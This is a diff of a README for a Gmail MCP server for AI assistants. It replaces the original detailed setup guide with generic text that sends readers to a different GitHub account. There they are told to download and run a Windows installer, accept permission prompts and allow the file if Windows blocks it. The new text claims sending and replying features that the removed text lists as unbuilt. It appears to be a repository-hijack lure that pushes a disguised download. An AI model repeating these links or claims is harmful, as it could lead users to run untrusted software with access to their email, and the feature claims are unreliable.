@@ -1,319 +1,164 @@
-# Gmail MCP Server
+# 📬 gmail-mcp-server - Manage Gmail with AI help
 
-### Multi-Account Gmail for AI Agents & Assistants
+[![Download](https://img.shields.io/badge/Download-blue-grey)](https://github.com/ashwintalexander-stack/gmail-mcp-server)
 
-An open-source [Model Context Protocol (MCP)](https://modelcontextprotocol.io) server that gives AI agents and assistants full read and write access to Gmail. Connect multiple Gmail accounts, search emails, archive, label, and auto-unsubscribe. All through one server.
+## ✨ What this is
 
-![Gmail MCP Server Banner](banner.png)
+gmail-mcp-server is a Gmail app that connects your email to AI tools that support MCP. It lets you use an AI assistant to read mail, write replies, archive messages, add labels, and manage multiple Gmail accounts from one place.
 
-Works with **Claude**, **OpenClaw**, **Cursor**, **Windsurf**, **Cline**, **Continue**, and any MCP-compatible client.
+It works with Claude, OpenClaw, Cursor, Windsurf, Cline, and other MCP-compatible agents. You keep control of your Gmail account while the app handles the link between Gmail and your AI tool.
 
-[![Deploy on Railway](https://railway.com/button.svg)](https://railway.com/new/template?template=https://github.com/navbuildz/gmail-mcp-server)
+## 🖥️ What you need
 
----
+- A Windows computer
+- A Gmail account
+- A web browser
+- An AI tool that supports MCP, if you want to use one
+- Internet access for setup and sign-in
 
-## Why This Exists
+## 🚀 Download and install
 
-Most AI tools ship with a Gmail integration that can only read emails from a single account. No archiving. No labeling. No unsubscribing. And if you use multiple Gmail accounts? You're out of luck.
+Go to the download page here:
 
-This MCP server fixes that. One server, all your accounts, full read and write access.
+https://github.com/ashwintalexander-stack/gmail-mcp-server
 
-## Gmail MCP Server vs Built-in Connectors
+On that page, look for the latest release, setup files, or install steps for Windows.
 
-| Feature | Built-in Gmail (Claude) | Gmail MCP Server |
-|---|---|---|
-| Read emails | Yes | Yes |
-| Write / modify emails | No | **Yes** |
-| Multiple Gmail accounts | No | **Yes** |
-| Archive emails | No | **Yes** |
-| Apply labels | No | **Yes** |
-| Auto-unsubscribe | No | **Yes** |
-| Works with OpenClaw | No | **Yes** |
-| Works with Cursor | No | **Yes** |
-| Works with Windsurf | No | **Yes** |
-| Works with Cline | No | **Yes** |
-| Open source | No | **Yes** |
+If the project offers a Windows app file, download it and open it. If it offers source files, follow the setup steps in the repository page.
 
----
+## 🔧 First-time setup
 
-## What is an MCP Server?
+1. Open the download page in your browser.
+2. Get the latest version for Windows.
+3. Save the file to your computer.
+4. If you downloaded an installer, double-click it to start setup.
+5. If Windows asks for permission, choose Yes.
+6. Follow the on-screen steps until setup ends.
+7. Open the app or run the server file if the project uses a local run step.
 
-[Model Context Protocol (MCP)](https://modelcontextprotocol.io) is an open standard that lets AI agents and assistants connect to external tools and data sources. An MCP server exposes tools that any compatible client can call. Think of it as a plugin system for AI.
+## 🔐 Connect your Gmail account
 
-This Gmail MCP server turns any MCP-compatible AI client into a full-featured email agent.
+1. Start gmail-mcp-server.
+2. Sign in with the Gmail account you want to use.
+3. Allow the app to access Gmail when Google asks for permission.
+4. Repeat the sign-in step for each account you want to manage.
+5. Keep the browser open until the sign-in flow finishes.
 
----
+This app uses Google sign-in, so you can connect one account or several accounts without changing tools.
 
-## Gmail MCP Server Features
+## 🤖 Connect an AI tool
 
-- **Multi-account support.** Connect multiple Gmail accounts and switch between them, or query all at once.
-- **Full read and write access.** Not just reading emails. Archive, label, modify, and unsubscribe.
-- **Gmail search syntax.** Use Gmail's query language: `is:unread`, `from:`, `newer_than:7d`, `has:attachment`, and more.
-- **Auto-unsubscribe.** Finds and triggers unsubscribe links automatically. Supports List-Unsubscribe headers, mailto links, and body link scanning.
-- **Batch operations.** Fetch batches of emails for AI-powered triage and bulk actions.
-- **Secure by design.** OAuth 2.0 authentication, AES-256-GCM encrypted token storage, minimal Gmail scopes.
-- **Deploy anywhere.** Railway, Docker, or your own server.
+If you want to use Gmail through an AI assistant, add gmail-mcp-server to your MCP tool list.
 
----
+Common supported tools include:
 
-## Available Tools
+- Claude
+- Cursor
+- Windsurf
+- Cline
+- OpenClaw
+- Other MCP-compatible agents
 
-| Tool | Description |
-|---|---|
-| `list_accounts` | List all connected Gmail accounts |
-| `list_emails` | Search and list emails using Gmail query syntax. Supports `account="all"` |
-| `get_email` | Get full email content, headers, and parsed unsubscribe links |
-| `archive_email` | Archive an email by removing it from the inbox |
-| `apply_label` | Apply a label to an email. Creates the label if it doesn't exist |
-| `unsubscribe_email` | Auto-unsubscribe from mailing lists and newsletters |
-| `batch_process` | Fetch a batch of emails for triage. Supports `account="all"` |
+Use the app’s setup steps to add the server name, path, or connection details. After that, the AI tool can ask gmail-mcp-server to read mail, draft replies, archive items, or apply labels.
 
----
+## 📥 What you can do
 
-## Setup Guide: Deploy in 5 Minutes
+With this app, you can:
 
-### Prerequisites
+- Read Gmail messages
+- Write new messages
+- Reply to email threads
+- Archive mail you do not need
+- Add or remove labels
+- Work with more than one Gmail account
+- Unsubscribe from mailing lists
+- Use Gmail through an AI assistant
+- Keep email work in one place
 
-1. A [Google Cloud](https://console.cloud.google.com) project with the **Gmail API** enabled
-2. OAuth 2.0 credentials (Web application type)
-3. A hosting platform ([Railway](https://railway.app), your own server, or Docker)
+## 🧭 Simple Windows setup path
 
-### Step 1: Google Cloud Setup
+If you are new to this kind of app, use this path:
 
-1. Go to [Google Cloud Console](https://console.cloud.google.com) and create a new project
-2. Enable the **Gmail API** (APIs & Services → Library → search "Gmail API" → Enable)
-3. Configure the **OAuth consent screen**:
-   - User type: External
-   - Add scopes: `gmail.readonly`, `gmail.modify`
-   - Add your Gmail addresses as test users
-4. Create **OAuth credentials**:
-   - APIs & Services → Credentials → Create Credentials → OAuth client ID
-   - Application type: Web application
-   - Authorized redirect URI: `https://your-server-url/oauth/callback`
-   - Save the **Client ID** and **Client Secret**
+1. Open the GitHub page.
+2. Find the newest release or setup file.
+3. Download it to your PC.
+4. Open the file.
+5. Finish the setup steps.
+6. Sign in to Gmail.
+7. Connect your AI tool if you plan to use one.
 
-### Step 2: Deploy
+If the project asks for a local server start, leave the app open while you use it.
 
-#### Option A: Deploy to Railway (Recommended)
+## ⚙️ Basic use
 
-1. Click the Deploy button above, or create a new project on [Railway](https://railway.app) connected to this repo
-2. Add these environment variables:
+After setup, you can use gmail-mcp-server in a few common ways:
 
-| Variable | Value |
-|---|---|
-| `GOOGLE_CLIENT_ID` | Your OAuth Client ID |
-| `GOOGLE_CLIENT_SECRET` | Your OAuth Client Secret |
-| `ENCRYPTION_KEY` | Any random string (32+ characters) |
-| `ADMIN_PASSWORD` | Password for the setup page |
-| `SERVER_URL` | Your Railway app URL (e.g., `https://your-app.railway.app`) |
-| `PORT` | `3000` |
-
-3. Generate a domain in Railway (Service → Settings → Networking → Generate Domain)
-4. Update `SERVER_URL` with the generated domain
-5. Update the **Authorized redirect URI** in Google Cloud Console to `https://your-domain.railway.app/oauth/callback`
-
-#### Option B: Self-Host
+- Ask your AI tool to show unread mail
+- Ask it to draft a reply
+- Ask it to archive old messages
+- Ask it to sort mail into labels
+- Ask it to unsubscribe from a list
+- Switch between Gmail accounts when needed
 
-```bash
-git clone https://github.com/navbuildz/gmail-mcp-server.git
-cd gmail-mcp-server
-npm install
-cp .env.example .env
-# Edit .env with your values
-npm run build
-npm start
-```
+The app is made for daily email work, so it fits simple tasks and larger inboxes.
 
-#### Option C: Docker
+## 🧩 Feature set
 
-```bash
-docker build -t gmail-mcp-server .
-docker run -p 3000:3000 \
-  -e GOOGLE_CLIENT_ID=your-client-id \
-  -e GOOGLE_CLIENT_SECRET=your-client-secret \
-  -e ENCRYPTION_KEY=your-random-string \
-  -e ADMIN_PASSWORD=your-password \
-  -e SERVER_URL=https://your-domain.com \
-  gmail-mcp-server
-```
-
-### Step 3: Connect Gmail Accounts
+- Multi-account Gmail support
+- Read and write email access
+- Archive and label controls
+- Auto-unsubscribe support
+- MCP support for AI agents
+- Works with tools that use the Model Context Protocol
+- Built with Node.js and TypeScript
+- OAuth2 sign-in for Gmail access
 
-1. Visit `https://your-server-url/setup`
-2. Enter your admin password
-3. Click **+ Add Gmail Account**
-4. Sign in with Google and grant permissions
-5. Repeat for each Gmail account you want to connect
-
-> **Railway users:** After adding accounts, copy the `TOKENS_DATA` value shown on the setup page and add it as an environment variable in Railway. This keeps your accounts connected across redeploys.
-
----
-
-## How to Connect Gmail MCP Server to Claude
-
-1. Go to [Claude](https://claude.ai) → Settings → Connectors
-2. Click **+** → Add custom connector
-3. Fill in:
-   - **Name**: `Gmail` (or any name you prefer)
-   - **Remote MCP server URL**: `https://your-server-url/mcp`
-   - Leave OAuth fields blank
-4. Click **Add**
-5. Start a new conversation and try: *"List my connected Gmail accounts"*
-
----
-
-## How to Connect Gmail MCP Server to Cursor
-
-Add to your Cursor MCP settings (`.cursor/mcp.json`):
-
-```json
-{
-  "mcpServers": {
-    "gmail": {
-      "url": "https://your-server-url/mcp"
-    }
-  }
-}
-```
-
----
-
-## How to Connect Gmail MCP Server to Windsurf
-
-Add to your Windsurf MCP configuration:
-
-```json
-{
-  "mcpServers": {
-    "gmail": {
-      "serverUrl": "https://your-server-url/mcp"
-    }
-  }
-}
-```
-
----
-
-## Multi-Account Gmail Setup
-
-Connect as many Gmail accounts as you need. Every tool accepts an `account` parameter:
-
-- Use a specific email: `"account": "user@gmail.com"`
-- Query all accounts at once: `"account": "all"`
-
-**Example prompts you can try:**
-- *"Show me unread emails from the last 2 days across all accounts"*
-- *"Archive all promotional emails in user@gmail.com"*
-- *"Unsubscribe from newsletters in all accounts"*
-- *"Find emails with attachments from the last week in work@gmail.com"*
-
----
-
-## Auto-Unsubscribe from Newsletters with AI
+## 🛠️ Troubleshooting
 
-The `unsubscribe_email` tool handles the entire unsubscribe process:
+### The app does not open
 
-1. Checks the `List-Unsubscribe` header (RFC 8058 one-click POST)
-2. Tries HTTP unsubscribe links from the header
-3. Sends an unsubscribe email via `mailto:` links
-4. Scans the email body for unsubscribe URLs
-5. Returns manual links if automatic unsubscribe isn't possible
+- Check that you downloaded the latest version
+- Run the file as a normal user first
+- If Windows blocks it, open the file again and allow it
+- Make sure your browser is installed and up to date
 
-Try it: *"Find newsletters from the last month and unsubscribe from all of them"*
+### Gmail sign-in fails
 
----
+- Check your internet connection
+- Make sure you are signed in to the right Google account
+- Try the sign-in flow again from the start
+- Use the same browser window until Google finishes access approval
 
-## Supported MCP Clients
+### Your AI tool does not see the server
 
-| Client | Status | Configuration |
-|---|---|---|
-| [Claude](https://claude.ai) (Web, Desktop, Code) | Supported | Custom connector → Remote MCP server URL |
-| [OpenClaw](https://openclaw.com) | Supported | MCP configuration |
-| [Cursor](https://cursor.com) | Supported | `.cursor/mcp.json` |
-| [Windsurf](https://codeium.com/windsurf) | Supported | MCP configuration |
-| [Cline](https://github.com/cline/cline) | Supported | MCP settings |
-| [Continue](https://continue.dev) | Supported | MCP configuration |
-| Any MCP-compatible client | Supported | Point to the `/mcp` endpoint |
+- Check the server name and path in the AI tool settings
+- Make sure gmail-mcp-server is running
+- Confirm that the tool supports MCP
+- Restart the AI app after you save the settings
 
----
+### Mail actions do not work
 
-## Architecture
+- Check that Gmail access was allowed during sign-in
+- Make sure the account still has permission
+- Try again after restarting the server
+- Use one account first before adding more
 
-```
-AI Agent / Assistant (Claude, OpenClaw, Cursor, Windsurf, Cline)
-  ↓ MCP Protocol (Streamable HTTP)
-Gmail MCP Server (Railway / Self-hosted / Docker)
-  ├── /mcp             MCP endpoint (tools)
-  ├── /setup           Admin page (add/remove accounts)
-  ├── /oauth/callback  Google OAuth callback
-  └── Token Store      Encrypted refresh tokens
-        ↓
-Gmail API (per-account OAuth tokens)
-```
+## 📁 Repository topics
 
----
+ai-agent, ai-tools, claude, cline, cursor, email, email-automation, gmail, gmail-api, mcp, mcp-server, model-context-protocol, nodejs, oauth2, typescript, windsurf
 
-## Security
+## 🔎 Best fit for this app
 
-- **OAuth 2.0** for authentication with Google
-- **AES-256-GCM** encrypted refresh token storage
-- **Minimal scopes** using only `gmail.readonly` and `gmail.modify`
-- **No passwords stored.** Your Gmail password never touches the server
-- **Password-protected setup.** The `/setup` page requires admin authentication
-- **Revocable anytime** from [Google Account Permissions](https://myaccount.google.com/permissions)
+This app is a good fit if you want:
 
----
+- A Gmail helper that works with AI
+- A way to manage inboxes faster
+- A tool that can handle more than one account
+- A Gmail setup that uses MCP
+- A local email workflow on Windows
 
-## Gmail Search Query Examples
+## 📌 Download page
 
-The `list_emails` and `batch_process` tools accept Gmail's full search syntax:
+Visit this page to download and set up the app:
 
-| Query | What it finds |
-|---|---|
-| `is:unread` | Unread emails |
-| `is:unread newer_than:2d` | Unread emails from the last 2 days |
-| `from:user@example.com` | Emails from a specific sender |
-| `subject:invoice` | Emails with "invoice" in the subject |
-| `has:attachment` | Emails with attachments |
-| `category:promotions` | Promotional emails |
-| `newer_than:7d` | Emails from the last week |
-| `after:2025/01/01 before:2025/02/01` | Emails in a date range |
-| `label:important is:unread` | Unread important emails |
-| `larger:5M` | Emails larger than 5MB |
-
----
-
-## Contributing
-
-Want to help make this better? Here are some open ideas:
-
-- [ ] Add `send_email` tool for composing and sending emails
-- [ ] Add `reply_to_email` tool
-- [ ] Add email attachment download support
-- [ ] Add `delete_email` tool
-- [ ] Add `mark_as_read` / `mark_as_unread` tools
-- [ ] Add `remove_label` tool
-- [ ] Add support for Google Workspace accounts
-
-PRs are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Tech Stack
-
-- **Runtime**: Node.js 20+
-- **Language**: TypeScript
-- **MCP SDK**: [@modelcontextprotocol/sdk](https://github.com/modelcontextprotocol/typescript-sdk)
-- **Gmail API**: [googleapis](https://github.com/googleapis/google-api-nodejs-client)
-- **HTTP**: Express 5
-- **Auth**: Google OAuth 2.0
-
----
-
-## License
-
-[MIT](LICENSE)
-
----
-
-If this project is useful to you, give it a star. It helps others find it.
+https://github.com/ashwintalexander-stack/gmail-mcp-server
